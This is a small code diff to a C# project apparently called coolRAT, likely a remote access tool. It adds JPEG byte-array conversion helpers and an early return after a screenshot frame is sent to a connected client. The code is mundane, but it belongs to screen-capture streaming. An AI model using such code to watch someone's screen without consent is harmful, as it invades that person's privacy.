@@ -44,6 +44,23 @@ namespace coolRAT.Libs
             }
         }
 
+        public static byte[] ToByteArray(Image source)
+        {
+            using (var stream = new MemoryStream())
+            {
+                source.Save(stream, ImageFormat.Jpeg);
+                return stream.ToArray();
+            }
+        }
+
+        public static Image FromByteArray(byte[] source)
+        {
+            using (var stream = new MemoryStream(source))
+            {
+                return Image.FromStream(stream);
+            }
+        }
+
         public static string Encode(Image source)
         {
             using (MemoryStream m = new MemoryStream())
@@ -218,6 +235,7 @@ namespace coolRAT.Libs
                     LastFrame = (Bitmap)ImageCompressor.TakeScreenshot(Screen.PrimaryScreen);
                     screenFrame = new ScreenFrame(OwnerClient.UniqueId, LastFrame);
                     OwnerClient.SendPacket(screenFrame);
+                    return;
                 }
 
                 Bitmap bitmap_new = (Bitmap)ImageCompressor.TakeScreenshot(Screen.PrimaryScreen);
